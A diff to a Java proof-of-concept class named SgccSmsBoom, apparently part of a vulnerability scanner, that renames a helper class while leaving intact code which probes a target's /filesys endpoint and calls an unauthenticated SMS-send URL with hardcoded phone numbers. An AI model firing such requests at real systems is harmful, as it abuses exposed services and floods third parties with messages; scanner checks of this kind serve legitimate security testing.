@@ -13,7 +13,7 @@ import org.apache.http.client.methods.HttpGet;
 import org.apache.http.impl.client.CloseableHttpClient;
 import org.apache.http.util.EntityUtils;
 
-import cn.com.sgcc.marki_with_maven.misc.Tools;
+import cn.com.sgcc.marki_with_maven.misc.NetWorkTools;
 
 public class SgccSmsBoom implements IPocBase {
 
@@ -37,7 +37,7 @@ public class SgccSmsBoom implements IPocBase {
 		try {
 			String url = String.format("%s://%s:%s/filesys", serviceType.contains("https") ? "https":"http", ip, port );
 			HttpGet httpGet = new HttpGet(url);
-			customClient = new Tools().getCustomClient();
+			customClient = new NetWorkTools().getCustomClient();
 			CloseableHttpResponse resp = customClient.execute(httpGet);
 			if ( resp.getStatusLine().getStatusCode() == HttpStatus.SC_OK )
 			{
@@ -79,7 +79,7 @@ public class SgccSmsBoom implements IPocBase {
 		try {
 			String url = String.format("%s://%s:%s/filesys/sms/send?mobile=13087946034&content=%s:%ssmsboom", serviceType.contains("https") ? "https":"http", ip, port , "18799132963", ip);
 			HttpGet httpGet = new HttpGet(url);
-			customClient = new Tools().getCustomClient();
+			customClient = new NetWorkTools().getCustomClient();
 			CloseableHttpResponse resp = customClient.execute(httpGet);
 			String string = EntityUtils.toString(resp.getEntity());
 			if ( resp.getStatusLine().getStatusCode() == HttpStatus.SC_OK && string.contains("success"))
